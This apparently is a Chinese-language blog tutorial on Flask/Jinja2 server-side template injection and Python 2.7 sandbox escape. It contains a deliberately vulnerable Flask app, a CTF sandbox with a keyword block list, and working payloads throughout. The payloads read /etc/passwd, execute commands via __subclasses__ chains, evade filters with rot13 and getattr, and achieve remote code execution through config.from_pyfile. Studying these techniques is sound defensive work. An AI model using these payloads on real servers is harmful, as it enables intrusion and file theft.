---
title: Flask/Jinja2 SSTI && python 沙箱逃逸
date: 2018-06-25 11:09:34
tags:
	- python
	- Flask
	- 沙箱逃逸
---

# 前言
想着之前学了Flask,就正好把之前的SSTI模板注入，和python沙箱逃逸一起给学了  
虽然模板注入和沙箱逃逸是两码事，但是由于jinja2的python运行环境也是一个沙箱，就会涉及到到一些沙箱逃逸的东西  
而且沙箱逃逸也不仅仅只有在SSTI中发挥作用，所以虽然写在一起，但沙箱逃逸可能还会占一块比较大而独立的部分  

# SSTI
SSTI，又称服务端模板注入攻击。其发生在MVC框架中的view层。
> 服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题
  
先来看一段flask代码
```python
from flask import Flask, render_template_string, config

app = Flask(__name__)

@app.route('/<name>')
def index(name):
	template = '<h1>hello {}!<h1>'.format(name)
	return render_template_string(template)

app.run()
```
就是一个简单的欢迎页面，以一个字符串当作html模板返回给客户端，其中用format格式化的用户的输入，并插入在模板中  
![](/Flask-Jinja2-SSTI-python-沙箱逃逸/1.png)  
接下来来看看输入`{{ 2-1 }}`时的输出
![](/Flask-Jinja2-SSTI-python-沙箱逃逸/2.png)  
可以看到，用户的输入被插入到模板中，然后被jinja2语法解释器解析。返回了解析后的结果。  

由于jinja2在设计时就限制了不能执行过多的python语句，而且运行环境也是在一个沙箱中，以保证安全。  
jinja2的沙箱逃逸先后面再说，这里我们可以先获取一些flask运行时的数据  
如运行session的值（虽然这里暂时没有session）
![](/Flask-Jinja2-SSTI-python-沙箱逃逸/3.png)  
还有一些flask中的配置变量
![](/Flask-Jinja2-SSTI-python-沙箱逃逸/4.png)  
  
简而言之，就相当于控制了对方的view层，可以获取到一切jinja2中可以获取的数据  
但假如能逃逸jinja2的沙箱，就可能不仅仅只有那么点危害了..  

# python沙箱逃逸

## 概述
python沙箱逃逸主要是用于一些沙箱环境，如一些OJ或者一些在线交互终端，以及jinja2这种python模板解释器  
  
沙箱一般是限制指定函数的运行，或者对指定模块的删除以及过滤  

沙箱逃逸就是要逃离这种限制，让对方服务器运行我们指定的恶意代码，以达到getshell或者文件读取的目的
  
最后，这里的python沙箱逃逸用的是python2.7，python3可能有所不同  
  
## 一些任意代码执行以及文件读取的函数
**os** 执行系统命令
```python
import os
os.system('ipconfig')
```
  
**exec**  任意代码执行
```python
exec('__import__("os").system("ipconfig")')
```
  
**eval**  任意代码执行
```python
eval('__import__("os").system("ipconfig")')
```
  
**timeit**  本是检测性能的，也可以任意代码执行
```python
import timeit
timeit.timeit("__import__('os').system('ipconfig')",number=1)
```

**platform**
```python
import platform
platform.popen('ipconfig').read()
```
  
**subprocess**
```python
import subprocess
subprocess.Popen('ipconfig', shell=True, stdout=subprocess.PIPE,stderr=subprocess.STDOUT).stdout.read()
```
  
**file**
```python
file('/etc/passwd').read()
```
  
**open**
```python
open('/etc/passwd').read()
```

**codecs**
```python
import codecs
codecs.open('/etc/passwd').read()
```
  
## 一道ctf
不如先来看一道网上找到的ctf题，来熟悉下经典的逃逸方式
```python
from __future__ import print_function

banned = [
    "import",
    "exec",
    "eval",
    "pickle",
    "os",
    "subprocess",
    "kevin sucks",
    "input",
    "banned",
    "cry sum more",
    "sys"
]

targets = __builtins__.__dict__.keys()
targets.remove('raw_input')
targets.remove('print')
for x in targets:
    del __builtins__.__dict__[x]

while 1:
    print(">>>", end=' ')
    data = raw_input()

    for no in banned:
        if no.lower() in data.lower():
            print("No bueno")
            break
    else: # this means nobreak
        exec data
```
删除了内置函数，以及禁止了指定字符的出现  
不妨先来看下payload
```python
[].__class__.__base__.__subclasses__()[40]('flag.txt').read()
```
先通过`__class__`获取列表的类
```python
>>>[].__class__
<type 'list'>
```
再通过`__base__`获取基础类 object类（在python2.7中大部分类都继承了object类）
```python
>>> [].__class__.__base__
<type 'object'>
```
依次获取子类列表`__subclasses__()`
```python
>>> [].__class__.__base__.__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'sys.getwindowsversion'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'nt.stat_result'>, <type 'nt.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <type 'operator.itemgetter'>, <type 'operator.attrgetter'>, <type 'operator.methodcaller'>, <type 'functools.partial'>, <type 'MultibyteCodec'>, <type 'MultibyteIncrementalEncoder'>, <type 'MultibyteIncrementalDecoder'>, <type 'MultibyteStreamReader'>, <type 'MultibyteStreamWriter'>, <class 'string.Template'>, <class 'string.Formatter'>]
```
这样就找了更多可以拓展的类，就更方便于我们找到我们想要执行的函数  
```python
>>> [].__class__.__base__.__subclasses__()[40]
<type 'file'>
```
第四十个索引恰好是想要的file类型，就可以用它进行文件读取了
```python
>>> [].__class__.__base__.__subclasses__()[40]('d:/1.txt').read()
'hello world!'
```
  
再让我们来看下另一个命令执行的payload
```python
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')
```
前面一部分思路类似于之前文件读取的思路，就直接来到这里
```python
>>> ().__class__.__bases__[0].__subclasses__()[59]
<class 'warnings.WarningMessage'>
```
可以看到是获取了一个warnings.WarningMessage类，然后继续执行`__init__`后获取全局变量
> func_globals返回一个包含函数全局变量的字典引用  

然后获取linecache模块（其中包含了os模块）
```python
>>> ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache']
<module 'linecache' from 'D:\Python\Python27\lib\linecache.pyc'>
```
然后用`__dict__`获取指定模块（由于对输入的字符进行了限制，所以要找个利用字符串获取指定模块的方式）
> \_\_dict\_\_是一个字典，键为属性名，值为属性值  

```python
>>> ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os']
<module 'os' from 'D:\Python\Python27\lib\os.pyc'>
```
成功获取到了os模块，然后命令执行即可
```python
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')
```

## 逃逸思路
当函数被禁用时，就要通过一些类中的关系来引用被禁用的函数  

一些常见的寻找特殊模块的方式

- **\_\_class\_\_**:获得当前对象的类
- **\_\_bases\_\_**:列出其基类  
- **\_\_mro\_\_** :列出解析方法的调用顺序，类似于bases
- **\_\_subclasses\_\_()**：返回子类列表
- **\_\_dict\_\_** ： 列出当前属性/函数的字典
- **func_globals**返回一个包含函数全局变量的字典引用


## 一些防御与对抗措施

### 禁止引入敏感包
比如通过正则匹配之类的，拒绝`import os`、`import commands`之类的语句出现  
这是最低级的一种防御措施，可以通过一些编码来进行混淆  

```python
f3ck = __import__("pbzznaqf".decode('rot_13'))
print f3ck.getoutput('ifconfig')
```
或者配合`getattr`函数
```python
import codecs
getattr(os,codecs.encode("flfgrz",'rot13'))('ifconfig')
```
或者进行一些base64,倒序之类的。  
总之，只要找到一个以字符形式执行代码的总是会有办法的

### 删除\_\_builtins\_\_中的函数
就比如之前那个ctf例子中的
```python
for x in targets:
    del __builtins__.__dict__[x]
```
可以通过reload重新导入`__builtins__`模块`reload(__builtin__)`  

reload也是`__builtins__`中的一个函数，假如它也被删了的话，还可以尝试一个imp的模块
```python
import imp
imp.reload(__builtin__)
```

### 修改sys.modules
由于import导入包时，是从sys.path中去导入对应的包  
防御者可能会对其进行修改，导致无法导入想要的模块  
  
这时可以自己尝试修改模块的位置`sys.modules['os']='/usr/lib/python2.7/os.py'`
或者尝试运行一遍`os.py`，也就相当于导入了一次os模块
```python
execfile('/usr/lib/python2.7/os.py')
```

### 寻找数据链
大多数情况下时，可以尝试利用类似之前的payload，通过类之间的关系，寻找对应的数据链  
然后找到你想要的函数引用，就可以进行命令执行了


# Jinja2中的沙箱逃逸
沙箱逃逸讲完了，就再回来看看如何逃逸Jinja2的沙箱  
和之前环境类似
```python
from flask import Flask, render_template_string, request

app = Flask(__name__)

@app.route('/')
def index():
	name = request.args.get('name')
	template = '<h1>hello {}!<h1>'.format(name)
	return render_template_string(template)

app.run()
```
环境依旧是2.7，利用之前那个payload，我们很容易就能进行任意文件读取  
```
http://192.168.5.128:5000/{{ [].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() }}
```
![](/Flask-Jinja2-SSTI-python-沙箱逃逸/5.png)  
  
但，其实能做的远不止这些  
  
在config对象中，`from_pyfile`可以将对象加载到Flask的配置环境中
```python
def from_pyfile(self, filename, silent=False):
        """Updates the values in the config from a Python file.  This function
        behaves as if the file was imported as module with the
        :meth:`from_object` function.

        :param filename: the filename of the config.  This can either be an
                         absolute filename or a filename relative to the
                         root path.
        :param silent: set to `True` if you want silent failure for missing
                       files.

        .. versionadded:: 0.7
           `silent` parameter.
        """
        filename = os.path.join(self.root_path, filename)
        d = imp.new_module('config')
        d.__file__ = filename
        try:
            with open(filename) as config_file:
                exec(compile(config_file.read(), filename, 'exec'), d.__dict__)
        except IOError as e:
            if silent and e.errno in (errno.ENOENT, errno.EISDIR):
                return False
            e.strerror = 'Unable to load configuration file (%s)' % e.strerror
            raise
        self.from_object(d)
        return True
```
这里我们可以利用file类向tmp目录下写入py文件，然后再对其编译，加载到config变量中  
先进行文件的写入
```
http://192.168.5.128:5000/?name={{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/cmd', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
```
![](/Flask-Jinja2-SSTI-python-沙箱逃逸/6.png)
可以看到成功将文件写入  
然后对其编译加载到config变量中
![](/Flask-Jinja2-SSTI-python-沙箱逃逸/7.png)
可以看到成功的将变量注册到了config中
![](/Flask-Jinja2-SSTI-python-沙箱逃逸/8.png)
接下来就可以任意命令执行了
![](/Flask-Jinja2-SSTI-python-沙箱逃逸/9.png)
  
因此Jinja2中并不能因为其是一个沙箱环境，就忽视了SSTI的危害。  
切记不能将用户输入传递到模板当中，至少目前情况可以直接get整个物理机的shell





# Reference link
https://blog.0kami.cn/2016/09/16/old-python-sandbox-escape/  
https://hatboy.github.io/2018/04/19/Python沙箱逃逸总结/  
https://xz.aliyun.com/t/52
http://www.freebuf.com/articles/web/98928.html
